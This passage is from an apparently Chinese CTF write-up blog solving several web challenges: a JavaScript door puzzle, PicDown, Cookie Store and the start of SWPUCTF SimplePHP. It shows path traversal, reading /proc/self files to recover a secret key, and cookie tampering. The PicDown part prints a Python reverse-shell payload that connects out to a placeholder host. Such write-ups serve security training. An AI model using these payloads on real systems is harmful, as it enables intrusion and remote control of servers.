class="hljs-attr">value</span>=<span class="hljs-string">&quot;342&quot;</span> /&gt;</span>342<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;343&quot;</span> /&gt;</span>343<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;344&quot;</span> /&gt;</span>344<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;345&quot;</span> /&gt;</span>345<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;346&quot;</span> /&gt;</span>346<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;347&quot;</span> /&gt;</span>347<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;348&quot;</span> /&gt;</span>348<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;349&quot;</span> /&gt;</span>349<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;350&quot;</span> /&gt;</span>350<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;351&quot;</span> /&gt;</span>351<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;352&quot;</span> /&gt;</span>352<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;353&quot;</span> /&gt;</span>353<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;354&quot;</span> /&gt;</span>354<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;355&quot;</span> /&gt;</span>355<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;356&quot;</span> /&gt;</span>356<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;357&quot;</span> /&gt;</span>357<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;358&quot;</span> /&gt;</span>358<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;359&quot;</span> /&gt;</span>359<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&quot;check_door()&quot;</span>&gt;</span>Check<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>最底下有个 通过 door.js 引用的check_door()函数，跟进</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_door</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> all_radio = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;door_form&quot;</span>).elements;<br>  <span class="hljs-keyword">var</span> guess = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; all_radio.length; i++)<br>    <span class="hljs-keyword">if</span> (all_radio[i].checked) guess = all_radio[i].value;<br><br>  rand = <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">360</span>);<br>  <span class="hljs-keyword">if</span> (rand == guess) <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/open/&quot;</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/die/&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进这个 &#x2F;open&#x2F;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><br>&lt;!DOCTYPE html&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to Earth<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/open_sesame.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>YOU FOUND THE DOOR!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>How do you open it?<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/img/door.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;door&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:60vw;&quot;</span> /&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">      open(0);</span><br><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>跟进这个引用js文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params">ms</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params">i</span>) </span>&#123;<br>  sleep(<span class="hljs-number">1</span>).then(<span class="hljs-function">() =&gt;</span> &#123;<br>    open(i + <span class="hljs-number">1</span>);<br>  &#125;);<br>  <span class="hljs-keyword">if</span> (i == <span class="hljs-number">4000000000</span>) <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/fight/&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 &#x2F;flight&#x2F;</p><p>借一下dalao的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#https://blog.csdn.net/qq_40327508/article/details/110283866</span><br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><br>flag = [<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>]<br><br>item = permutations(flag)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> item:<br>k = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">list</span>(i))<br><span class="hljs-keyword">if</span> k.startswith(<span class="hljs-string">&#x27;pctf&#123;hey_boys&#x27;</span>) <span class="hljs-keyword">and</span> k[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br><span class="hljs-built_in">print</span>(k)<br><br><br></code></pre></td></tr></table></figure><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><code>?url=../../../../../flag</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201262347189.png" alt="image-20220126234705722"></p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>先传入</p><p><code>/proc/self/cmdline</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201262350947.png" alt="image-20220126235052879"></p><p>然后去获得这个 app.py 直接输入app.py 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br>app = Flask(__name__)<br><br>SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br>f = <span class="hljs-built_in">open</span>(SECRET_FILE)<br>SECRET_KEY = f.read().strip()<br>os.remove(SECRET_FILE)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/page&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page</span>():</span><br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>            res = urllib.urlopen(url)<br>            value = res.read()<br>            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)<br>            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, res=value)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">manager</span>():</span><br>    key = request.args.get(<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(SECRET_KEY)<br>    <span class="hljs-keyword">if</span> key == SECRET_KEY:<br>        shell = request.args.get(<span class="hljs-string">&quot;shell&quot;</span>)<br>        os.system(shell)<br>        res = <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        res = <span class="hljs-string">&quot;Wrong Key!&quot;</span><br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><p>这种secretkey不可能获取不到 ，最后在 <code>/proc/self/fd/3 </code> 找到了它  ，这是因为代码只执行了打开但是没有执行关闭操作，这就导致了文件依然在内存中存在<code>Zg4OUfGWrk3wzEL1qa2ws8ZjE4H+32IoveGs+PzTK8k=</code></p><p>记得将key url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">no_one_know_the_manager?key=Zg4OUfGWrk3wzEL1qa2ws8ZjE4H%2B32IoveGs%2BPzTK8k%3D&amp;shell=&amp;shell=python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;<br></code></pre></td></tr></table></figure><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>说是cookie</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271801220.png" alt="image-20220127180138149"></p><p>看cookie 这个session的值真的一眼顶真(base64)</p><p><code>&#123;&quot;money&quot;: 48, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;]&#125;</code> 解码结果</p><p>直接修改 马内 对应的值重新弄成base64就行</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271803839.png" alt="image-20220127180323762"></p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>通过如下方式可以获取源码</p><p><code>http://95ef3b71-97f1-445e-929f-f8f74270f430.node4.buuoj.cn:81/file.php?file=index.php</code> 别的不演示</p><p>整理代码<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;base.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>base.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br>    session_start(); <br><span class="hljs-meta">?&gt;</span> <br>&lt;!DOCTYPE html&gt; <br>&lt;html&gt; <br>&lt;head&gt; <br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt; <br>    &lt;title&gt;web3&lt;/title&gt; <br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt; <br>    &lt;script src=<span class="hljs-string">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt; <br>    &lt;script src=<span class="hljs-string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt; <br>&lt;/head&gt; <br>&lt;body&gt; <br>    &lt;nav <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">navbar</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">default</span>&quot; <span class="hljs-title">role</span>=&quot;<span class="hljs-title">navigation</span>&quot;&gt; </span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span>-<span class="hljs-title">fluid</span>&quot;&gt; </span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">navbar</span>-<span class="hljs-title">header</span>&quot;&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">a</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">navbar</span>-<span class="hljs-title">brand</span>&quot; <span class="hljs-title">href</span>=&quot;<span class="hljs-title">index</span>.<span class="hljs-title">php</span>&quot;&gt;首页&lt;/<span class="hljs-title">a</span>&gt; </span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">nav</span> <span class="hljs-title">navbra</span>-<span class="hljs-title">toggle</span>&quot;&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">active</span>&quot;&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">file</span>.<span class="hljs-title">php</span>?<span class="hljs-title">file</span>=&quot;&gt;查看文件&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">upload_file</span>.<span class="hljs-title">php</span>&quot;&gt;上传文件&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">            &lt;/<span class="hljs-title">ul</span>&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">right</span>&quot;&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">index</span>.<span class="hljs-title">php</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">glyphicon</span> <span class="hljs-title">glyphicon</span>-<span class="hljs-title">user</span>&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">_SERVER</span>[&#x27;<span class="hljs-title">REMOTE_ADDR</span>&#x27;];?&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">            &lt;/<span class="hljs-title">ul</span>&gt; </span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt; </span><br><span class="hljs-class">    &lt;/<span class="hljs-title">nav</span>&gt; </span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt; </span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt; </span><br><span class="hljs-class">&lt;!--<span class="hljs-title">flag</span> <span class="hljs-title">is</span> <span class="hljs-title">in</span> <span class="hljs-title">f1ag</span>.<span class="hljs-title">php</span>--&gt;</span><br></code></pre></td></tr></table></figure><p>upload_file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br>upload_file(); <br><span class="hljs-meta">?&gt;</span> <br>&lt;html&gt; <br>&lt;head&gt; <br>&lt;meta charest=<span class="hljs-string">&quot;utf-8&quot;</span>&gt; <br>&lt;title&gt;文件上传&lt;/title&gt; <br>&lt;/head&gt; <br>&lt;body&gt; <br>&lt;div align = <span class="hljs-string">&quot;center&quot;</span>&gt; <br>        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; <br>&lt;/div&gt; <br>&lt;style&gt; <br>    p&#123; margin:<span class="hljs-number">0</span> auto&#125; <br>&lt;/style&gt; <br>&lt;div&gt; <br>&lt;form action=<span class="hljs-string">&quot;upload_file.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt; <br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;文件名:&lt;/label&gt; <br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span>&gt;&lt;br&gt; <br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;提交&quot;</span>&gt; <br>&lt;/div&gt; <br><br>&lt;/script&gt; <br>&lt;/body&gt; <br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//show_source(__FILE__); </span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>; <br>header(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); <br>error_reporting(<span class="hljs-number">0</span>); <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span 